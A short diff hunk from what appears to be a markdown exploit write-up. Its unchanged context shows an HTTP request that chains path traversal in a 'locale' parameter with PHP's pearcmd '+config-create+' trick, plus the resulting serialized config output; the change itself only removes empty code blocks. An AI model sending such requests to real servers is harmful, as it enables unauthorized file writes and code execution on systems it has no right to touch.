@@ -793,7 +793,3 @@ GET /locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php
 
 mysql from 11.8.3-MariaDB, client 15.2 for Linux (x86_64) using  EditLine wrapper/pear/cache";s:12:"download_dir";s:114:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql from 11.8.3-MariaDB, client 15.2 for Linux (x86_64) using  EditLine wrapper
 ```
-
-```
-
-```
